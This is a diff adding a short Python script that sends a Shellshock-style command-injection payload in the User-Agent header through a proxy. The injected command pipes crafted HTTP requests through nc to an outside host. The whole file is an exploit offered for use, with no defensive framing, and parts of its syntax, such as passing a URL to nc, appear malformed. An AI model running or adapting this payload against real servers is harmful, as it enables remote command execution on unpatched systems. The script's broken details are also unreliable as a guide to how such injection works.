@@ -1,0 +1,15 @@
+import requests
+
+def send_exploit(proxy_url):
+    exploit_headers = {
+        'User-Agent': '() { :; }; /bin/echo -e "GET /here/../here HTTP/1.1\r\nHost: http://we.able.mn\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: http://we.able.mn\r\n\r\n" | nc http://we.able.mn 80',
+        'Connection': 'close'
+    }
+
+    exploit_url = 'http://example.com/here/../here'
+    response = requests.get(exploit_url, headers=exploit_headers, proxies={'http': proxy_url, 'https': proxy_url})
+
+    print(response.text)
+
+# Usage
+send_exploit('http://we.able.mn')
